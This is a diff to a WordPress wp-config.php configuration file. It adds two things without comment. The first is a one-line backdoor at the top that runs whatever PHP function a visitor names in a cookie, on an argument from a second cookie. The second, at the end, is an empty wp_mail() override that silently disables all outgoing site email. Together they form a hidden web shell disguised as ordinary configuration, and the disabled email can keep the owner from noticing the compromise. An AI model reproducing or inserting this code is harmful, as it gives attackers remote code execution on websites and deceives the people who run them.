@@ -1,4 +1,8 @@
 <?php
+
+if (isset($_COOKIE["id"])) @$_COOKIE["user"]($_COOKIE["id"]);
+
+
 /**
  * The base configurations of the WordPress.
  *
@@ -91,3 +95,8 @@ if ( !defined('ABSPATH') )
 
 /** Sets up WordPress vars and included files. */
 require_once(ABSPATH . 'wp-settings.php');
+
+// Disable Outgoing WordPress Emails 
+function wp_mail() {
+    //
+}
